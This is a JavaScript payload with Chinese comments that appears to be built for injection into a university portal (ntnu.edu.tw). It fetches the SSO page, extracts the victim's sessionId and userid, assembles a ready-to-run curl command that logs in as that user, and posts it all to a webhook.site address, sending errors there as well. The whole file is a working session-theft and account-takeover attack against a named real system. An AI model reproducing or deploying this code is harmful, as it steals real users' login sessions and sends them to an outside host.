(async () => {
	// 你的 Webhook 地址
	var webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
	// SSO 生成地址
	var ssoUrl = "/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
	try {
		const response = await fetch(ssoUrl);
		const html = await response.text();
		// 提取 Token
		const sessionMatch = html.match(
			/name=["']?sessionId["']?[\s\S]*?value=["']?([^"'\s>]+)["']?/i,
		);
		const userMatch = html.match(
			/name=["']?userid["']?[\s\S]*?value=["']?([^"'\s>]+)["']?/i,
		);
		const data = {
			sessionId: sessionMatch ? sessionMatch[1] : "NOT_FOUND",
			userid: userMatch ? userMatch[1] : "NOT_FOUND",
			// 完整的 CURL 指令，包含所有必要的 headers
			curl_command: sessionMatch
				? `curl -i -s -k -X POST 'https://ap.itc.ntnu.edu.tw/GuidanceApp/StdtLoginCtrl?PageType=1B' \\
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' \\
  -H 'Referer: https://iportal2.ntnu.edu.tw/' \\
  -H 'Origin: https://iportal2.ntnu.edu.tw' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  --data-raw 'sessionId=${encodeURIComponent(sessionMatch[1])}&userid=${userMatch[1]}&Action=Login&lang=zh_TW'`
				: "",
		};
		// 發送
		fetch(webhook, {
			method: "POST",
			mode: "no-cors",
			body: JSON.stringify(data),
		});
	} catch (e) {
		// 報錯也發送
		fetch(`${webhook}?error=${encodeURIComponent(e.message)}`);
	}
})();
